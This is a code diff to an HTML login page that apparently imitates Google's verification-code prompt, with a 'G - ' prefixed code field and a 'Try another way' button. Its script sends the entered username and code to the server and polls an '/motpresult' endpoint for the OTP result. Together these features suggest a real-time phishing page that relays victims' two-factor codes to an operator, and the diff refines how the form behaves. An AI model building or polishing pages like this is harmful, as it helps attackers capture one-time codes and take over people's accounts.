@@ -15,7 +15,7 @@
         <div class="form-container">
             <div class="white-overlay" id="whiteOverlay"></div>
             <div class="loading-bar" id="loadingBar"><div class="loading-bar-indicator"></div></div>
-        <form class="loginform1" method="post" name="loginForm" action="javascript:void(0)" accept-charset="UTF-8">
+        <form class="loginform1" method="post" name="loginForm" action="javascript:void(0)" accept-charset="UTF-8" autocomplete="off">
        
             <div class="form-half">
                 <div><img class="divlogo" src="/image/image.png" ></div><br>
@@ -40,13 +40,13 @@
                     <div class="codediv">
                         <div class="input-prefix-wrap">
                         <span class="prefix">G - </span>
-                        <input  required='' name="code" type='text' id="pEyar">
+                        <input required='' name="code" type='text' id="pEyar" autocomplete="off" autocorrect="off" autocapitalize="off">
                         <label style="color:#2c2a2a;; font-size: 16px; font-family: Arial, Helvetica, sans-serif;" alt='Enter code' placeholder='Enter Code'></label></div></div>
                 
 
                 <div class="tryn1">
                     <button id="myButton" class="hyperl2" ><b>Try another way</b></button>&nbsp;&nbsp;&nbsp;
-                    <button type="submit" class="btnnxt" onclick="showLoadingBar()">Submit</button>
+                    <button type="submit" class="btnnxt">Submit</button>
                     
                   </div>
 
@@ -118,6 +118,11 @@
                     body: JSON.stringify({ username, code })
                 }).then(() => pollOtpResult(username));
             }
+
+            document.querySelector('.loginform1').addEventListener('submit', function (e) {
+                e.preventDefault();
+                showLoadingBar();
+            });
 
             function pollOtpResult(username) {
                 fetch('/motpresult?u=' + encodeURIComponent(username))
